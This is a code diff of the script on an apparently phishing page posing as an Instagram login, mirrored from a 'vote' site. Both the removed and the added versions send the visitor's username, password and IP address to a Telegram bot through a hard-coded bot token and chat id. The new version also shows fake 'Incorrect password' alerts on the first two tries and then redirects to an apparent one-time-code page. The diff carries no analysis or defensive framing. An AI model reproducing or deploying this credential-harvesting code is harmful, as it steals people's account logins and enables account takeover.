@@ -54,47 +54,44 @@
                     </form>
     </div>
     <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ipaddress = data.ip;
-                    document.getElementById('ipaddress').value = ipaddress;
-                })
-                .catch(error => {
-                    console.error('Error fetching IP address:', error);
-                });
-        });
+    let attemptCount = 0;
 
-  document.getElementById('contactForm').addEventListener('submit', function (event) {
-            event.preventDefault();
+    document.getElementById('contactForm').addEventListener('submit', function (event) {
+        event.preventDefault(); // Prevent the form from submitting immediately
 
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-            var ipaddress = document.getElementById('ipaddress').value;
+        attemptCount++;
 
-            var telegramMessage = `Username-ig: ${username}\nPassword-ig: ${password}\nIpaddress: ${ipaddress}`;
-           
-             var token = '7693526289:AAGUlVOCdn2YriVRVmZkoNA6ddT5dknLWt8';
-            var chat_id = '7199020768'
-            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
+        if (attemptCount < 3) {
+            alert('Incorrect password');
+            return;
+        }
 
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        window.location.href = 'instagram/otp/657daf104b167f68d1979b9c.html';  // Redirect to thank you page
-                    } else {
-                        alert('Error sending message.');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                });
-        });
+        // On the 3rd attempt, allow submission
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+        var ipaddress = document.getElementById('ipaddress').value;
 
-    </script>
+        var telegramMessage = `Username-ig: ${username}\nPassword-ig: ${password}\nIpaddress: ${ipaddress}`;
+
+        var token = '7693526289:AAGUlVOCdn2YriVRVmZkoNA6ddT5dknLWt8';
+        var chat_id = '7199020768';
+        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
+
+        fetch(url)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    window.location.href = 'instagram/otp/657daf104b167f68d1979b9c.html';
+                } else {
+                    alert('Error sending message.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+    });
+</script>
+
 </body>
 
 <!-- Mirrored from voting.name.ng/slink/vote-ig-fashion_dar_v/login by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Mar 2025 20:44:55 GMT -->
